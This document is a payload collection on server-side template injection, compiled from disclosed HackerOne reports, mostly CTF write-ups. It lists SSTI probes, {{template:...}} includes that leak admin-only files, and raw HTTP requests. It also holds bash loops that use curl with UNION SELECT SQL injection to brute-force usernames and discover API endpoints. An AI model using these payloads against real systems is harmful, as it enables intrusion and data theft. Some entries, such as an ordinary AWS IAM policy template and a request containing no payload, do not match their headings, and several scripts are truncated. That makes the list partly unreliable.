# Server-Side Template Injection

30 payloads from disclosed reports.

## Server-side template injection using Mustache/Handlebars style {{...}} to include a template

### `235d43a0`

```
{{7*7}}
```

**Parameter:** `name`
— [\[h1-415 2020\] H1-415 CTF Writeup by W--](https://hackerone.com/reports/780285) · h1-ctf · [w--](https://hackerone.com/w--)

### `25e301c1`

```
${7*7}
```

**Parameter:** `name`
— [\[h1-415 2020\] H1-415 CTF Writeup by W--](https://hackerone.com/reports/780285) · h1-ctf · [w--](https://hackerone.com/w--)

### `a2077164`

```
POST /api/build/save HTTP/1.1
Host: 3d.cs.money
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/json;charset=utf-8
Content-Length: 8197
Origin: https://target.com
Connection: close
Referer: https://target.com/item/1A0EmD0OCs
Cookie: __cfduid=dd4a5ae822200c2e5a6622942c8e9b5c61600828055; TEST_GROUP=6; UUID3D=z8yNnunP7rEULv4; _ga=GA1.1
```

**Parameter:** `background`
— [Bypass restrict of member subscription to use custom background in https://target.com without prime subscription](https://hackerone.com/reports/989415) · CS Money · [khoabda1](https://hackerone.com/khoabda1)

### `491e22a4`

```
preview_markup=Hello {{name}} ....asd&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Parameter:** `preview_markup`
— [Hackyholidays CTF writeup](https://hackerone.com/reports/1065583) · h1-ctf · [xehle](https://hackerone.com/xehle)

### `39c219c9`

```
{{template:38dhs_admins_only_header.html  }}
```

— [Hackyholidays CTF writeup](https://hackerone.com/reports/1065583) · h1-ctf · [xehle](https://hackerone.com/xehle)

### `2d162fd5`

```
value='{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}'
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `e2eaa67a`

```
{{name}}
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `e36d376d`

```
{{template:RANDOMTHINGS}}
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `1e7d97d0`

```
{{email}}
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `78763a16`

```
{{template:<TEMPLATE_NAME>}}
```

**Parameter:** `preview_data`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `a22f60fb`

```
Hi {{name}}
```

**Parameter:** `preview_markup`
— [\[hacky-holidays\] Grinch network is down](https://hackerone.com/reports/1066206) · h1-ctf · [mzfr](https://hackerone.com/mzfr)

### `5766c0c9`

```
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

**Parameter:** `preview_markup`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `df974e67`

```
{{template:cbdj3_grinch_header.html}}
```

— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `e6f1213a`

```
{{template:cbdj3_grinch_footer.html}}
```

— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `40c8d1c0`

```
{{template:cbdj3_grinch_header.html}}Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

**Parameter:** `markup`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `25ae1363`

```
{{template:<file-name>}}
```

**Parameter:** `markup`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `54356c13`

```
{{template:}}
```

**Parameter:** `markup`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `b52de00f`

```
{{payload}}
```

**Parameter:** `markup`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `665b2749`

```
{"payload":"{{template:38dhs_admins_only_header.html}}"}
```

**Parameter:** `data`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `3478fcbb`

```
{{template:..}}
```

— [How The Hackers Saved Christmas](https://hackerone.com/reports/1069335) · h1-ctf · [nytr0gen](https://hackerone.com/nytr0gen)

### `651f42ed`

```
preview_markup=Hello{{name}}{{template:38dhs_admins_only_header.html}}{{email}}&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Parameter:** `preview_markup`
— [Hackyholidays \[ h1-ctf\] writeup \[mission:- stop the grinch \]](https://hackerone.com/reports/1069396) · h1-ctf · [kunal94](https://hackerone.com/kunal94)

### `be55ea4e`

```
preview_markup={{email}}&preview_data={"name":"aaaa","email":"{{template:38dhs_admins_only_header.html}}"}
```

**Parameter:** `preview_data`
— [Hackyholidays \[ h1-ctf\] writeup \[mission:- stop the grinch \]](https://hackerone.com/reports/1069396) · h1-ctf · [kunal94](https://hackerone.com/kunal94)

### `4c2aa729`

```
1. Open [                                             ] and Enter the mail Payload : sudo_bash{{8*8}}@wearehackerone.com
```

**Parameter:** `email`
— [Self-DoS due to template injection via email field in password reset form on target.com](https://hackerone.com/reports/1265344) · Acronis · [sudo_bash](https://hackerone.com/sudo_bash)

### `e13d715b`

```
"Condition": {
    "StringEquals": {
        "aws:SourceAccount": "{{ account_id }}"
    },
    "ArnLike": {
        "aws:SourceArn": "arn:aws:bedrock-agentcore:{{ region }}:{{ account_id }}:*"
    }
}
```

— [Bedrock AgentCore Starter Toolkit Creates Gateway IAM Roles Without Confused Deputy Protections](https://hackerone.com/reports/3632577) · AWS VDP · [mistercloudsec](https://hackerone.com/mistercloudsec)


## SSTI via the preview_markup parameter using {{name}} placeholder

### `1f033cca`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com

preview_markup=Hello{{name}}+....+whatever&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Parameter:** `preview_markup`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)

### `34acefe3`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com
preview_markup=Hello+{{name}}+email:+{{email}}&preview_data={"name":"zonduu","email":"murphy@hacktheplanet.com"}
```

**Parameter:** `preview_markup`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)


## Blind SQL injection via UNION SELECT in the 'hash' parameter to enumerate usernames

### `de712df7`

```
# chr function to get ascii chars
chr() {
  [ "$1" -lt 256 ] || return 1
  printf "\\$(printf '%03o' "$1")"
}

while true
do
        for x in {48..57} {97..122};
        do
                letter=$(chr $x);
                #letter=$(urlencode "$letter");
                new="$dis";
                url=$(curl -s -k "https://target.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/user?username=${new}${letter}%25%27+--+-%22,%2712%27,1--+
```

**Parameter:** `hash`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)


## Command/variable injection through URL parameter using ${...} syntax to concatenate password fragments

### `1accee53`

```
?username=grinchadmin%26password=${new}${letter}%25
```

**Parameter:** `username`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)


## SQL injection using UNION SELECT in the 'hash' GET parameter to traverse files

### `7fa4de3d`

```
while read line; do
        curl -s -k "https://target.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/${line}%27+--+-%22,%2712%27,1--+-" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | sed 's/^/https\:\/\/target.com/' | anew valid-endpoints > /dev/null;
done < api.txt

while read line; do
        curl -s -k "${line}" > output;
        if cat output | grep 'Invalid content type detected' > /dev/null; then
    
```

**Parameter:** `hash`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)


## SSTI chaining template injection to retrieve admin header via {{template:...}} in preview_markup

### `0a99309a`

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: target.com
preview_markup={{flag}}&preview_data={"flag":"{{template:38dhs_admins_only_header.html}}"}
```

**Parameter:** `preview_markup`
— [Grinch Networks compromised!](https://hackerone.com/reports/1066504) · h1-ctf · [zonduu](https://hackerone.com/zonduu)
